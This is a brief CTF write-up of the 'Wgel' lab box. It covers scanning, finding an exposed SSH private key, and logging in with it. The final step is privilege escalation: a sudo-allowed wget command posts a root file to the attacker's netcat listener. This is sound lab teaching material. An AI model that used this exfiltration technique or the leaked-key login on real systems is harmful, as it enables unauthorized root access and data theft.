# Wgel CTF

### Wgel CTF
Nmap scan shows ports 22 and 80 open. Port 80 is a default apache webpage. In the comments, there's a comment: <br />
![image](https://github.com/user-attachments/assets/969869b1-1cde-4169-8f7c-5485221e46bf)<br />
Self reminder: remember to ALWAYS take one step at a time. Even if it's a default page, look at the source code anyways, don't skip steps.<br /><br />

Directory enumeration shows `/sitemap`. After some enumeration, Nikto revealed a private ssh key: <br />
![image](https://github.com/user-attachments/assets/8ab40b14-bb99-440c-bec0-f316f671559f)<br />
So I copied it on my machine, changed it's permission with `chmod 600 id_rsa` and used it to log into jessie's account with `ssh jessie@ip_addr -i id_rsa`. The user flag is inside `/home/jessie/Documents`.
<br />
For privesc, if I run `sudo -l`, I get: <br />
![image](https://github.com/user-attachments/assets/57ae99c1-58b0-462a-aa73-91ba3afc7ca9)<br />
So jessie can run `wget` with sudo privileges. Since wget can also perform POST requests, I'm going to send the contents of `/root/root_flag.txt` to my self. So I open a netcat listener on port 80 on my machine, and then on the target machine run `sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.11.85.53`:<br />
![image](https://github.com/user-attachments/assets/aec08a45-16c3-4c8e-af77-0cf2eb8136f6)<br />


